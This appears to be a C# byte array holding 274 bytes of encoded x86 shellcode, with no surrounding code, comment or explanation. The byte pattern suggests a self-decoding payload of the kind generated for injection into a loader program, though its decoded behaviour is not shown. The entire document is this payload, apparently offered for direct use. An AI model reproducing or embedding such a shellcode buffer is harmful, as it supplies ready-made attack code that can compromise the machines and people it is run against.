byte[] buf = new byte[274] {
0xdb,0xd7,0xb8,0x80,0x35,0xcc,0xa2,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,
0x3e,0x31,0x46,0x1a,0x83,0xc6,0x04,0x03,0x46,0x16,0xe2,0x75,0x8d,0x7e,0xcb,
0x39,0x1f,0xa4,0xc6,0x18,0xab,0x7d,0x23,0xc1,0x7d,0xb7,0x7a,0xcd,0xfe,0x84,
0x79,0x1c,0x42,0x05,0x81,0xaf,0x23,0xb7,0x81,0x00,0x7b,0xec,0x59,0xb9,0x41,
0x00,0x9e,0x86,0x92,0xe8,0x8b,0x92,0xc3,0xb6,0xaf,0x4f,0x4e,0x8a,0xb4,0xd7,
0x94,0xdd,0xfb,0x21,0x78,0xdb,0x20,0xe7,0xd1,0xcb,0x68,0x29,0x45,0x70,0x40,
0xb6,0xdc,0x6e,0xde,0x4e,0x30,0x9c,0xc8,0x27,0x64,0x44,0x65,0x2c,0x2b,0x8b,
0xab,0x5a,0x12,0x98,0xe8,0xd0,0x76,0xef,0xd3,0x10,0xa8,0x37,0x36,0x37,0x36,
0x6c,0xbc,0x98,0x45,0xf6,0xcb,0x70,0xa4,0xc6,0xd1,0x2a,0x98,0xf1,0xfb,0x78,
0x96,0x7c,0xe3,0x0a,0x24,0x97,0x64,0xdb,0x22,0xd9,0xa7,0x42,0x2f,0xa8,0x49,
0xc4,0x1b,0x81,0xbe,0x37,0x26,0x03,0xf6,0x1c,0x6c,0xd4,0x42,0x1c,0xd7,0x35,
0x5f,0x11,0xb9,0x49,0x82,0xa2,0x73,0xac,0x24,0xce,0xf1,0xf9,0xec,0xfb,0x18,
0xd8,0xb6,0x9e,0xce,0x4a,0xfa,0xeb,0x8b,0xb9,0xeb,0xe2,0xd8,0x43,0x7c,0x9f,
0x14,0xad,0x25,0x23,0xbd,0xed,0x65,0x0d,0x82,0x2a,0x45,0x57,0x4e,0x18,0x36,
0x0a,0x8c,0xfa,0xb2,0xa4,0xb7,0x63,0x93,0x49,0x1d,0x6a,0xb0,0x4d,0xc3,0x8d,
0x9b,0x32,0x05,0x8b,0xf5,0x5d,0xc5,0xb4,0x37,0xdb,0xc0,0x46,0xdb,0xa6,0x77,
0x73,0xc8,0xc1,0x8d,0x40,0x08,0xe2,0xdf,0x8e,0x39,0x6d,0x6e,0xb6,0xb1,0x7f,
0x87,0x88,0xd5,0xbe,0xac,0x97,0x7f,0x1b,0x5e,0xa8,0x04,0xc5,0xec,0x41,0x59,
0x39,0xa3,0x60,0xe9 };
